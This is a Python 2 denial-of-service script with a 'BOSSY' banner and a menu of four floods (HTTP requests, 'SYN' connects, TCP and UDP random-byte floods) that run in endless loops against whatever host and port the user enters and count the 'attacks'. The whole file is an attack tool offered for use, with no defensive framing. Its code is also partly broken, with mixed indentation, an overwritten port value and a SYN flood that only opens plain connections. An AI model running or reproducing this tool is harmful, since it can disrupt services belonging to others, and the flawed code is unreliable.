import socket
import random
import sys
import time

running = True
count = 0

class httpDos():
    def __init__(self, host, port=80, port1=443):
        self.host = host
        self.port = port
	self.port = port1
        self.run(host, port, port1)
    def run(self, host, port, port1):
        while running:
            ip = socket.gethostbyname(host)
            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            msg = 'Null'
            try:
                dos.connect((host, 80))
                dos.send("GET / HTTP/1.1\r\n")
                dos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
                global count; count+=1
            except socket.error:
                print "[!] Unknown Host"
                dos.close()
                sys.exit(1)
	
class synFlood():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.syn = socket.socket()
        self.run(ip, port)
    def run(self, ip, port):
        while running:
            try:
                self.syn.connect((ip, port))
                global count; count+=1
            except: pass

class tcpFlood():
    def __init__(self, ip, port, size):
        self.ip = ip
        self.port = int(port)
        self.size = size
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp.connect((ip, port))
        self.run(ip, port, size)
    def run(self, ip, port, size):
        while running:
            try:
                byte = random._urandom(size)
                self.tcp.setblocking(0)
                self.tcp.sendto(byte, (ip, port))
                global count; count+=1
            except:
                pass

class udpFlood():
    def __init__(self, ip, port, size):
        self.ip = ip
        self.port = port
        self.size = size
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.run(ip, port, size)
    def run(self, ip, port, size):
        while running:
            try:
                byte = random._urandom(self.size)
                self.udp.sendto(byte, (self.ip, self.port))
                global count; count+=1
            except:
            	pass

def banner():
	print """
  ____   ___  ____ ______   __
 | __ ) / _ \/ ___/ ___\ \ / /
 |  _ \| | | \___ \___ \\ V / 
 | |_) | |_| |___) |__) || |  
 |____/ \___/|____/____/ |_|  
                              """

if __name__ == '__main__':
	try:
		banner()
		print """> [1] HTTP DoS
> [2] SYN Flood
> [3] TCP Flood
> [4] UDP Flood"""
		option = input("Choose Any Options: ")
		while type(option) != int: option = input("Choose any options: ")
		if option == 1: #HTTP DOS
			host = raw_input("Enter the Host: "); port = input("Port No: ")
			httpDos(host, port)
		elif option == 2: # SYN FLOOD
			ip = raw_input("Enter IP: "); port = input("Port No: ")
			synFlood(ip, port)
		elif option == 3: # TCP FLOOD
			ip = raw_input("Enter IP: "); port = input("Port No: "); size = input("Size: ")
			tcpFlood(ip, port, size)
		elif option == 4: # UDP FLOOD
			ip = raw_input("Enter IP: "); port = input("Port No: "); size = input("Size: ")
			udpFlood(ip, port, size)

	except KeyboardInterrupt:
		print "\n[!] Process Interrupted"
		print "Attacked ", count, " times."
		sys.exit(0)
